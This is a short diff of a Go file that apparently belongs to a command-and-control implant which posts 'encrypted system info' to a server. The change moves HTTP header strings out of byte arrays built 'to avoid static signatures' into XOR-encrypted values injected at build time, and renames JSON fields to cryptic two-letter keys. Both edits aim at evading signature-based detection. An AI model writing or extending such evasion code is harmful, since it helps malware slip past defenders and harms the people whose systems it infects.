@@ -21,18 +21,9 @@ import (
 	"time"
 )
 
-// HTTP strings (constructed to avoid static signatures)
-var (
-	httpHeaderUserAgent   = string([]byte{0x55, 0x73, 0x65, 0x72, 0x2d, 0x41, 0x67, 0x65, 0x6e, 0x74})                                     // User-Agent
-	httpHeaderContentType = string([]byte{0x43, 0x6f, 0x6e, 0x74, 0x65, 0x6e, 0x74, 0x2d, 0x54, 0x79, 0x70, 0x65})                         // Content-Type
-	httpMetaId            = string([]byte{0x69, 0x64})                                                                                     // id
-	httpMetaEncryption    = string([]byte{0x65, 0x6e, 0x63, 0x72, 0x79, 0x70, 0x74, 0x69, 0x6f, 0x6e})                                     // encryption
-	httpEncRsaAes         = string([]byte{0x72, 0x73, 0x61, 0x2b, 0x61, 0x65, 0x73})                                                       // rsa+aes
-
-	// Padding length headers
-	httpHeaderPadPre = string([]byte{0x58, 0x2d, 0x50, 0x61, 0x64, 0x2d, 0x50, 0x72, 0x65}) // X-Pad-Pre
-	httpHeaderPadApp = string([]byte{0x58, 0x2d, 0x50, 0x61, 0x64, 0x2d, 0x41, 0x70, 0x70}) // X-Pad-App
-)
+// HTTP strings are injected via ldflags (XOR encrypted) and decrypted at startup in getEnv.go
+// Variables defined in main.go: httpHeaderUserAgent, httpHeaderContentType, httpHeaderPadPre,
+// httpHeaderPadApp, httpMetaId, httpMetaEncryption, httpEncRsaAes
 
 // placeInLocation places data in the specified HTTP location
 // output format: "body", "header:<name>", "cookie:<name>", "query:<name>", "uri_append"
@@ -108,15 +99,15 @@ func buildRequestWithTransforms(method, baseURL string, clientIDDataBlock *DataB
 // PostData represents the structure of our post request body
 type PostData struct {
 	Data      string            `json:"data"`      // Our encrypted system info
-	Metadata  map[string]string `json:"metadata"`  // Additional metadata
-	Timestamp int64             `json:"timestamp"` // Current timestamp
+	Metadata  map[string]string `json:"md"`  // Additional metadata
+	Timestamp int64             `json:"ts"` // Current timestamp
 }
 
 type SignedResponse struct {
-	Status             string `json:"status"`
-	NewClientID        string `json:"new_client_id"`
-	SecretsInitialized bool   `json:"secrets_initialized"`
-	Signature          string `json:"signature"`
+	Status             string `json:"st"`
+	NewClientID        string `json:"nc"`
+	SecretsInitialized bool   `json:"si"`
+	Signature          string `json:"sg"`
 	Seed               string `json:"seed"`
 }
 
